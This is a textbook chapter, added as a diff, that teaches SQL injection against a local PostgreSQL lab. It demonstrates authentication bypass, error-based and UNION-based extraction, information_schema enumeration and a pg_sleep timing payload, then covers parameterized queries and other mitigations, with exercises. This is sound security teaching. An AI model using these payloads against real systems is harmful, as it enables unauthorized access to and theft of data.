@@ -2,3 +2,291 @@
 title: "SQL Injection"
 ---
 
+The previous two chapters covered the access control tools PostgreSQL provides: roles define identity, and privileges define what each identity can do. Together they form a coherent permission model. But there is a category of attack that bypasses this model entirely, not by guessing passwords or escalating privileges, but by hijacking the SQL statements your application constructs in the first place.
+
+SQL injection (SQLi) is consistently one of the top vulnerabilities in web applications, catalogued for decades in the OWASP Top 10. Understanding how it works is a prerequisite to defending against it. This chapter demonstrates the mechanics of SQL injection using your local Docker container, covers the most common attack patterns, and shows how parameterized queries eliminate the vulnerability at its root.
+
+::: {.callout-warning}
+The attacks demonstrated in this chapter are run against a database you control locally. Performing SQL injection against systems you do not own or have explicit permission to test is illegal and unethical. The goal here is defensive knowledge: you need to see how attacks work in order to write code that prevents them.
+:::
+
+## How SQL Injection Works
+
+SQL injection exploits applications that construct SQL queries by concatenating user-supplied input directly into the query string. When the application fails to validate or sanitize that input, an attacker can supply input that changes the *structure* of the query rather than just its *data*.
+
+Consider a hypothetical Python application that looks up a student by name:
+
+```python
+name = request.args.get("name")
+query = f"SELECT * FROM students WHERE last_name = '{name}'"
+db.execute(query)
+```
+
+If a user submits the name `Walsh`, the query becomes:
+
+```sql
+SELECT * FROM students WHERE last_name = 'Walsh'
+```
+
+That works as intended. But if a user submits `' OR '1'='1`, the query becomes:
+
+```sql
+SELECT * FROM students WHERE last_name = '' OR '1'='1'
+```
+
+Because `'1'='1'` is always true, this query returns every row in the table. The user-supplied input escaped the string literal and injected new SQL logic. The database executes it faithfully because it has no way to distinguish data from code at query time.
+
+## Setting Up the Lab
+
+This lab uses the `university` database and a simplified version of the `students` table. Connect to your local container and run the following setup:
+
+```bash
+psql -U postgres -p 5433 -d university
+```
+
+```sql
+DROP TABLE IF EXISTS students_lab;
+
+CREATE TABLE students_lab (
+    student_id  SERIAL       PRIMARY KEY,
+    first_name  TEXT         NOT NULL,
+    last_name   TEXT         NOT NULL,
+    email       TEXT         NOT NULL UNIQUE,
+    gpa         NUMERIC(3,2)
+);
+
+INSERT INTO students_lab (first_name, last_name, email, gpa)
+VALUES
+    ('Maria',  'Santos',  'msantos@university.edu',  3.85),
+    ('James',  'Okafor',  'jokafor@university.edu',  3.41),
+    ('Priya',  'Nair',    'pnair@university.edu',    NULL),
+    ('Connor', 'Walsh',   'cwalsh@university.edu',   2.97),
+    ('Admin',  'Account', 'admin@university.edu',    NULL);
+```
+
+## Classic Authentication Bypass
+
+The most widely known SQL injection pattern targets login forms. Suppose an application checks credentials with:
+
+```sql
+SELECT * FROM accounts WHERE username = '<input>' AND password = '<input>';
+```
+
+An attacker who submits the username `' OR 1=1 --` with any password turns this into:
+
+```sql
+SELECT * FROM accounts WHERE username = '' OR 1=1 --' AND password = '...';
+```
+
+The `--` starts a SQL comment, which causes the database to ignore everything after it, including the password check. The `OR 1=1` condition makes the `WHERE` clause always true. The query returns a valid account row, and the application logs in the attacker.
+
+You can observe the pattern against `students_lab`. The following shows what the injected query looks like:
+
+```sql
+-- Normal query: last name is 'Walsh'
+SELECT * FROM students_lab WHERE last_name = 'Walsh';
+
+-- After injecting: last name is  ' OR 1=1 --
+SELECT * FROM students_lab WHERE last_name = '' OR 1=1 --';
+```
+
+Run both queries and compare the results. The first returns one row; the second returns all rows.
+
+## Error-Based Injection
+
+In error-based SQLi, the attacker deliberately causes the database to produce error messages that contain useful information: table names, column names, data types, or even data values. This works when an application reflects database error messages back to the user, which is a common misconfiguration in development environments.
+
+Type mismatches are a reliable way to extract data via error messages. If you know the application is passing a numeric ID to a query, you can inject a subquery that returns text into an integer context:
+
+```sql
+SELECT * FROM students_lab
+WHERE student_id = 1
+  AND 1 = CAST((SELECT email FROM students_lab LIMIT 1) AS INTEGER);
+```
+
+Run this query in `psql`. The cast fails because an email address cannot be converted to an integer, and PostgreSQL returns an error that includes the value that caused the failure:
+
+```
+ERROR:  invalid input syntax for type integer: "msantos@university.edu"
+```
+
+The email address was extracted via the error message. By adjusting `OFFSET`, the attacker can iterate through every row:
+
+```sql
+-- First email
+SELECT * FROM students_lab
+WHERE student_id = 1
+  AND 1 = CAST(
+    (SELECT email FROM students_lab ORDER BY student_id LIMIT 1 OFFSET 0)
+    AS INTEGER);
+
+-- Second email
+SELECT * FROM students_lab
+WHERE student_id = 1
+  AND 1 = CAST(
+    (SELECT email FROM students_lab ORDER BY student_id LIMIT 1 OFFSET 1)
+    AS INTEGER);
+```
+
+Each query reveals the next email address in the error message.
+
+## UNION-Based Injection
+
+UNION-based injection appends a second `SELECT` to the original query using the `UNION` operator. The injected query's results are returned alongside (or instead of) the legitimate results, often displayed directly in the application's output.
+
+For `UNION` to work, the injected `SELECT` must return the same number of columns as the original query, with compatible data types. The attacker first determines the column count.
+
+### Column Count Discovery
+
+Inject incrementing `ORDER BY` column numbers until the query errors:
+
+```sql
+-- Succeeds: 5 columns exist
+SELECT * FROM students_lab WHERE last_name = 'Walsh' ORDER BY 5;
+
+-- Errors: column 6 does not exist
+SELECT * FROM students_lab WHERE last_name = 'Walsh' ORDER BY 6;
+```
+
+Alternatively, probe with `UNION SELECT NULL, NULL, ...`:
+
+```sql
+-- Too few columns (errors)
+SELECT * FROM students_lab WHERE last_name = 'zzz' UNION SELECT NULL, NULL, NULL;
+
+-- Correct column count (succeeds)
+SELECT * FROM students_lab WHERE last_name = 'zzz' UNION SELECT NULL, NULL, NULL, NULL, NULL;
+```
+
+Using a last name that matches no rows (`'zzz'`) ensures only the injected row appears in the result.
+
+### Extracting Data
+
+Once the column count is known, the attacker can inject arbitrary queries:
+
+```sql
+SELECT * FROM students_lab
+WHERE last_name = 'zzz'
+UNION
+SELECT 1, 'injected', 'data', version(), NULL;
+```
+
+Run this in `psql`. The result contains one row with the PostgreSQL version string in the fourth column, extracted without any prior knowledge.
+
+A real attack would pivot to enumerating tables from `information_schema.tables`:
+
+```sql
+SELECT * FROM students_lab
+WHERE last_name = 'zzz'
+UNION
+SELECT 1, table_schema, table_name, table_type, NULL
+FROM   information_schema.tables
+WHERE  table_schema NOT IN ('pg_catalog', 'information_schema')
+LIMIT 5;
+```
+
+This returns every user-created table in the database, giving the attacker a roadmap to extract data table by table.
+
+## Other Attack Types
+
+Error-based and UNION-based are two of the most common patterns, but the broader SQLi landscape includes several other techniques.
+
+**Boolean-based blind injection** applies when the application gives no direct output, only behaving differently depending on whether a query returned rows. The attacker infers information one bit at a time by injecting conditions that are true or false (`AND 1=1` vs `AND 1=2`). By asking yes/no questions about the data — for example, `AND ASCII(SUBSTRING(email, 1, 1)) > 64` — the attacker reconstructs values character by character.
+
+**Time-based blind injection** is used when the application gives no behavioral feedback at all. The attacker injects a conditional delay and measures whether the response slows down:
+
+```sql
+WHERE student_id = 1
+  AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL;
+```
+
+A five-second delay confirms the condition was true. This works even when the application swallows all errors and returns identical responses regardless of query outcome.
+
+**Stacked queries** allow the attacker to inject a semicolon and append entirely new SQL statements — `INSERT`, `UPDATE`, `DROP`, or anything else. Whether this is possible depends on the database driver; many drivers disable stacked queries explicitly.
+
+**Second-order injection** (stored injection) occurs when malicious input is stored safely in the database by one operation, then later retrieved and used in query construction without being re-sanitized. The injection fires not on insert, but on a subsequent read.
+
+**Out-of-band injection** extracts data via a side channel such as a DNS request or HTTP call triggered from within the database. This requires elevated privileges and the right server configuration, but it is effective when no in-band data channel is available to the attacker.
+
+## Prevention: Parameterized Queries
+
+Every SQL injection vulnerability has the same root cause: user input is treated as SQL code rather than as data. The definitive fix is a **parameterized query** (also called a prepared statement), which separates the query structure from the data entirely.
+
+With a parameterized query, the SQL is compiled by the database first, and then the data values are supplied separately. The database never interprets the data as SQL. No matter what a user submits, it can only be a value, not part of the query's logic.
+
+In Python with psycopg2:
+
+```python
+# Vulnerable: string concatenation
+query = f"SELECT * FROM students WHERE last_name = '{name}'"
+cur.execute(query)
+
+# Safe: parameterized query
+query = "SELECT * FROM students WHERE last_name = %s"
+cur.execute(query, (name,))
+```
+
+In Python with SQLAlchemy (the approach used in the ETL section of this book):
+
+```python
+from sqlalchemy import text
+
+stmt = text("SELECT * FROM students WHERE last_name = :name")
+result = conn.execute(stmt, {"name": name})
+```
+
+The `%s` and `:name` placeholders are never filled by string operations in your code. The database driver handles substitution at the protocol level, after query compilation.
+
+You can observe the protection in `psql` using prepared statements directly:
+
+```sql
+PREPARE lookup_student (TEXT) AS
+    SELECT * FROM students_lab WHERE last_name = $1;
+
+-- Legitimate use
+EXECUTE lookup_student('Walsh');
+
+-- Injection attempt: returns zero rows, not all rows
+EXECUTE lookup_student(''' OR 1=1 --');
+```
+
+The last `EXECUTE` returns zero rows. The single quote in the input is treated as a literal character in the string `' OR 1=1 --`, not as SQL syntax. The query finds no student whose last name is exactly `' OR 1=1 --`.
+
+### Input Validation Is Not Enough
+
+Filtering or escaping user input before building the query string is not an adequate substitute for parameterized queries. Escaping approaches can be bypassed when character encoding is involved, when the input appears in a context other than a quoted string (such as a column name or numeric value), or when the escaping logic itself contains a bug. Parameterized queries do not escape input — they eliminate the possibility of input affecting query structure.
+
+Validation (checking that a value is within expected bounds or format) is still worthwhile as defense in depth, but parameterization is the non-negotiable requirement.
+
+### Additional Mitigations
+
+A layered approach reduces the impact if an injection does occur:
+
+- **Least privilege**: the database role used by the application should have only the privileges it needs. A role that can only `SELECT` from specific tables cannot modify data even if injection succeeds.
+- **Error message suppression**: applications should return generic error messages to users and log database errors server-side only. Error-based injection relies on the application reflecting database internals to the caller.
+- **Web Application Firewalls (WAFs)**: can detect and block common injection patterns at the network layer, but should be considered a supplementary control rather than a primary defense.
+- **Stored procedures**: encapsulating business logic in stored procedures can reduce the SQL surface area the application constructs, though stored procedures can themselves contain injection vulnerabilities if written without parameterization.
+
+## Exercises
+
+**1.** Run the authentication bypass pattern against `students_lab` using a last name of `' OR 1=1 --`. Confirm that all rows are returned. Then explain in your own words what structural change the injected input made to the original query.
+
+---
+
+**2.** Use the error-based technique to extract the email addresses of all five rows in `students_lab`. Write one query per row by adjusting the `OFFSET` value. Record the email address revealed in each error message.
+
+---
+
+**3.** Determine the column count of `students_lab` using `ORDER BY` probing. Then construct a UNION-based injection that returns the current database name (use `current_database()`) and the PostgreSQL version (use `version()`) in the result set. Use a last name that matches no real rows so only your injected row appears in the output.
+
+---
+
+**4.** Use a UNION-based injection to enumerate the user-created tables in the `university` database by querying `information_schema.tables`. Filter out the `pg_catalog` and `information_schema` schemas. What tables does your query reveal?
+
+---
+
+**5.** Construct a parameterized prepared statement in `psql` using `PREPARE` and `EXECUTE` that looks up a student by last name. Test it with a legitimate name, then test it with the injection string `' OR 1=1 --`. Explain why the injection attempt returns zero rows instead of all rows.
+
+---
+
+**6.** A developer argues that their application is safe because it strips all single quotes from user input before building the query. Describe two scenarios where this approach could still fail or be bypassed. What should the developer do instead?
